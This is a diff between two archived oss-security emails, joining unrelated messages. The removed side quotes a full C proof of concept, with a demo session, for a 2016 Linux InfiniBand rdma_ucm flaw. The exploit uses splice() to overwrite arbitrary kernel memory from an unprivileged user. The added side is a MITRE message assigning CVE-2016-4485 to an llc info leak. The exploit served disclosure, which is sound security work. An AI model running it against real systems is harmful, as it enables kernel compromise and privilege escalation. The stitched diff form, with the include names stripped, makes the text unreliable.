@@ -1,186 +1,42 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/09/11
-Message-ID: <1462821041.4268.43.camel@opteya.com>
-Date: Mon, 09 May 2016 21:10:41 +0200
-From: Yann Droneaud <ydroneaud@...eya.com>
-To: Jann Horn <jann@...jh.net>
-Cc: Jason Gunthorpe <jgunthorpe@...idianresearch.com>, Doug Ledford <dledford@...hat.com>, linux-rdma@...r.kernel.org,  oss-security@...ts.openwall.com
-Subject: Re: CVE Request: Linux: IB/security: Restrict use of the write() interface'
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/05/1
+Message-Id: <20160505015009.9BE7BB2E106@smtpvbsrv1.mitre.org>
+Date: Wed,  4 May 2016 21:50:09 -0400 (EDT)
+From: cve-assign@...re.org
+To: kangjielu@...il.com
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com, csong84@...ech.edu, taesoo@...ech.edu, insu@...ech.edu
+Subject: Re: CVE Request: kernel information leak vulnerability in llc module
 Content-Type: text/plain; charset=utf-8
 
-[Cc: oss-security@...ts.openwall.com]
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-Hi,
+> https://git.kernel.org/cgit/linux/kernel/git/davem/net.git/commit/?id=b8670c09f37bdf2847cc44f36511a53afc6161fd
+> 
+> The stack object "info" has a total size of 12 bytes. Its last byte is
+> padding which is not initialized and leaked via "put_cmsg".
 
-Le lundi 09 mai 2016 à 20:02 +0200, Jann Horn a écrit :
-> On Sat, May 07, 2016 at 08:19:46PM +0200, Yann Droneaud wrote:
-> > Le samedi 07 mai 2016 à 06:22 +0200, Salvatore Bonaccorso a écrit :
-> > > 
-> > >  
-> > > Jann Horn reported an issue in the infiniband stack. It has been
-> > > fixed in v4.6-rc6 with commit
-> > > e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3:
-> > > 
-> > > https://git.kernel.org/linus/e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3
-> > > 
-> > > > 
-> > > > 
-> > > > IB/security: Restrict use of the write() interface
-> > > > The drivers/infiniband stack uses write() as a replacement for
-> > > > bi-directional ioctl().  This is not safe. There are ways to
-> > > > trigger write calls that result in the return structure that
-> > > > is normally written to user space being shunted off to user
-> > > > specified kernel memory instead.
-> > > > 
-> > That's an interesting issue.
-> > 
-> > I thought access_ok() done as part of copy_to_user() would protect
-> > from such unwelcomed behavior. But it's not if the kernel invoke
-> > write() handler outside of a user process.
-> > 
-> > Anyway, as I don't see yet how to reproduce the issue, is there a
-> > PoC available, I would be interested by a mean to trigger such
-> > write().
+Use CVE-2016-4485.
 
-> Here is my writeup of the issue that I made quite a while ago - the
-> timeline is missing some of the more recent stuff, but meh.
-> 
-> ======================================================
-> 
-> 
-> Here is a PoC that can be used to clobber data at arbitrary
-> writable kernel addresses if the rdma_ucm module is loaded (without
-> actually needing Infiniband hardware to be present):
-> 
-> =====
-> #define _GNU_SOURCE
-> #include 
-> #include 
-> #include 
-> #include 
-> #include 
-> #include 
-> 
-> #include 
-> #include 
-> #include 
-> #include 
-> #include 
-> 
-> #define RDMA_PS_TCP 0x0106
-> 
-> // This method forces the kernel to write arbitrary data to the
-> // target fd under set_fs(KERNEL_DS), bypassing address limit
-> // checks in anything that extracts pointers from written data.
-> int write_without_addr_limit(int fd, char *buf, size_t len) {
->   int pipefds[2];
->   if (pipe(pipefds))
->     return -1;
->   ssize_t len_ = write(pipefds[1], buf, len);
->   if (len == -1)
->     return -1;
->   int res = splice(pipefds[0], NULL, fd, NULL, len_, 0);
->   int errno_ = errno;
->   close(pipefds[0]);
->   close(pipefds[1]);
->   errno = errno_;
->   return res;
-> }
-> 
-> int clobber_kaddr(unsigned long kaddr) {
->   // open infiniband fd
->   int fd = open("/dev/infiniband/rdma_cm", O_RDWR);
->   if (fd == -1)
->     err(1, "unable to open /dev/infiniband/rdma_cm - maybe the RDMA kernel module isn't loaded?");
-> 
->   // craft malicious write buffer
->   // structure:
->   //   struct rdma_ucm_cmd_hdr hdr
->   //   struct rdma_ucm_create_id cmd
->   char buf[sizeof(struct rdma_ucm_cmd_hdr) + sizeof(struct rdma_ucm_create_id)];
->   struct rdma_ucm_cmd_hdr *hdr = (void*)buf;
->   struct rdma_ucm_create_id *cmd = (void*)(buf + sizeof(struct rdma_ucm_cmd_hdr));
->   hdr->cmd = RDMA_USER_CM_CMD_CREATE_ID;
->   hdr->in = 0;
->   hdr->out = sizeof(struct rdma_ucm_create_id_resp);
->   cmd->ps = RDMA_PS_TCP;
->   cmd->response = kaddr;
-> 
->   int res = write_without_addr_limit(fd, buf, sizeof(buf));
->   int errno_ = errno;
->   close(fd);
->   errno = errno_;
->   return res;
-> }
-> 
-> int main(int argc, char **argv) {
->   if (argc != 2)
->     errx(1, "want one argument (kernel address to clobber)");
->   char *endp;
->   unsigned long kaddr = strtoul(argv[1], &endp, 0);
->   if (kaddr == ULONG_MAX || *endp || endp == argv[1])
->     errx(1, "bad input number");
-> 
->   int r = clobber_kaddr(kaddr);
->   if (r >= 0) {
->     printf("that probably worked? clobber_kaddr(0x%lx)=%d\n", kaddr, r);
->     return 0;
->   } else {
->     printf("failed: %m\n");
->     return 1;
->   }
-> }
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-
-Is this only achievable through splice() ?
-
-
-> =====
-> 
-> And here is an example that shows that this indeed works, tested
-> on a Debian distro kernel:
-> 
-> First, as root (warning: this will make the currently running system
-> exploitable):
-> root@...ian:~# modprobe rdma_ucm
-> 
-> Now, as attacker:
-> user@...ian:~$ cat /proc/sys/vm/swappiness
-> 60
-> user@...ian:~$ ls -l /dev/infiniband/rdma_cm
-> crw-rw-rw- 1 root root 10, 59 Jan  9 23:07 /dev/infiniband/rdma_cm
-> user@...ian:~$ gdb -q -ex 'print &vm_swappiness' -ex quit
-> /usr/lib/debug/boot/vmlinux-$(uname -r)
-> Reading symbols from /usr/lib/debug/boot/vmlinux-3.16.0-4-
-> amd64...done.
-> $1 = (int *) 0xffffffff81861760 <vm_swappiness>
-> user@...ian:~$ gcc -Wall -std=gnu99 -o infiniwrite infiniwrite.c
-> user@...ian:~$ ./infiniwrite 0xffffffff81861760
-> that probably worked? clobber_kaddr(0xffffffff81861760)=32
-> user@...ian:~$ cat /proc/sys/vm/swappiness
-> 0
-> 
-> As you can see, the vm_swappiness variable in kernelspace was
-> overwritten by an unprivileged userspace process.
-> 
-> Timeline:
-> 2015-09-11 initial report to security@...nel.org and infiniband maintainers;
->         exploitability isn't entirely clear to me yet
-> 2015-09-11 infiniband maintainer responds, but apparently doesn't see an issue
-> 2015-12-26 I figure out the splice trick and ask the infiniband maintainers to
->         fix the issue
-> 2015-12-26 Andy Lutomirski asks the infiniband maintainers to fix the issue and
->         break the ABI if necessary
-> 2016-01-25 I send the PoC contained in this message to security@...nel.org and
->         the infiniband maintainers and ask them again to fix the issue.
-> 
-
-Thanks a lot !
-
-Regards.
-
--- 
-Yann Droneaud
-OPTEYA
-
-
+iQIcBAEBCAAGBQJXKqYEAAoJEHb/MwWLVhi2M5wP/0oANDPgSueRVuJpx2mV9ltb
+/YPO3BK4nSjzmdEd9do+6mTmz75TWVCGxEO7ET81u3lBI4rlAVC3zetSZftxlrnd
+UXYYvJgAkk3wORJ3ixCki178EG/Koswdh/UENFp0wZl1gCFwWff+TBq6ZoWfX+/w
+o8iV7M/xdjHUqAwEn38VjSdldLnHINq4Q9nWUGth/2aTRDCeu/e4XqdCk77EyP5D
+JU0dLF2cTbJrJkpXfXdZ4LGniJqEu6Wfnv5OZGOgfDouo/uCnKn16tKOhDFxLEN8
+3pZpXo2FMS5+rk4txzS2mYxOJCgnlkXXZF6ANrMlGZGZPfUmufX2IaaE+umrqL0i
+RhGelyYLmDK90tJF7pvWR8KzExhB3x1g8A7TwoauIVwH8e1pEvNzP3AUF0ceA+IX
+aN0WhfYMw5WSByWk2Ouw6r5s3ztTSXWJ3uzHo3C8bpedyVyWe+1GonWqbSH/e48U
+5sXI59uR3rzOTOUCWCKcRv3fuvgE8t60hTMs7DDl3BP82v5cp0ykpP78Hz51amNV
+EdnTmIVCbPkv8WKxzHQ4gobqpSvIlLUFMJp4bA7dj/z4AZmBplNkq3W3xQr99U3t
+8m6hVzJXWaJBCOeSmV8eumRalJaljy29V55+wVwONxshjb+BdlnC7FbPUcelfhX+
+6p5OZ9IH0ZpR5Gs7oOsQ
+=SIWz
+-----END PGP SIGNATURE-----
